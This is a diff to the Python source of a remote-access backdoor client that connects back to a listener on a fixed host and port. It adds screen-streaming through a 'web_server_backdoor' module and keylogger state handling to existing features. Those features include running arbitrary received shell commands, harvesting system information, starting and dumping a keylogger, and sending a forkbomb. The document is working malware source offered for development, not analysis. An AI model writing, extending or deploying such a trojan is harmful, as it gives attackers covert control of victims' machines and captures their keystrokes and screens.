@@ -13,14 +13,25 @@ import pyautogui
 import termcolor
 import platform
 import getpass
+import web_server_backdoor
+import cv2
+import mss
+import threading
+import time
+import pyautogui
 
 
-LHOST = "127.0.0.1";PORT = 4444
+resolution = pyautogui.size()
+
+
+
+
+
+LHOST = "127.0.0.1";PORT = 4443
 
 def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
-
 
 def reliable_recv():
     data = ''
@@ -109,14 +120,17 @@ def connection():
             s.close()
             break
         except:
-            connection()
+               connection()
+ 
+            
 
 
 def shell():
+    keylog_flag = 0
     while True:
         cmd = reliable_recv()
         if cmd == 'exit':
-            break
+            exit()
         elif cmd == 'help':
             pass
         elif cmd == 'clear':
@@ -153,11 +167,9 @@ def shell():
             os.remove('recorded.wav')
         elif cmd[:13] == 'screen_record':
             if cmd[14:] == 'on':
-                subprocess.Popen("python3 web.py", shell=True)
-                reliable_send(termcolor.colored('[+] Go to http://yourip/:5000', 'green'))
+                web_server_backdoor.start_server()
             if cmd[14:] == 'off':
-                subprocess.Popen("pkill -f web.py", shell=True)
-                reliable_send(termcolor.colored('[+] Done', 'green'))
+                web_server_backdoor.shutdown()
         # elif cmd == 'record_cam':
         #     cam_record()
         #     upload_file('cam_record.mp4')
@@ -173,6 +185,7 @@ def shell():
         Username: {getpass.getuser()}
         Release Version: {platform.release()}
         Processor Architecture: {platform.processor()}
+        Screen resolution {pyautogui.size()}
                     """, 'blue')
             reliable_send(sysinfo)
 
@@ -181,17 +194,25 @@ def shell():
                 os.fork()
             reliable_send(termcolor.colored("[+] Done sent forkbomb", 'green'))
         elif cmd[:12] == "keylog_start":
+            keylog_flag = 1
             keylog = keylogger.Keylogger()
             t = threading.Thread(target= keylog.start)
             t.start()
-            reliable_send('[+] Keylogger started!')
+            reliable_send(termcolor.colored('[+] Keylogger started!', 'green'))
         elif cmd[:11] == "keylog_dump":
-            log = keylog.read_logs()
-            reliable_send(log)
+            if keylog_flag == 1:
+                log = keylog.read_logs()
+                reliable_send(termcolor.colored(log, 'blue'))
+            else:
+                reliable_send(termcolor.colored("[-] Error can not dump because you didn't started the keylod", 'red'))
         elif cmd[:11] == "keylog_stop":
-            keylog.self_destruction()
-            t.join()
-            reliable_send('[+] Keylogger stopped!')
+            if keylog_flag == 1:
+                keylog.self_destruction()
+                t.join()
+                reliable_send(termcolor.colored('[+] Keylogger stopped!', 'green'))
+                keylog_flag = 0
+            else:
+                reliable_send(termcolor.colored("[-] Error can not dump because you didn't started the keylod", 'red'))
         else:
             execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
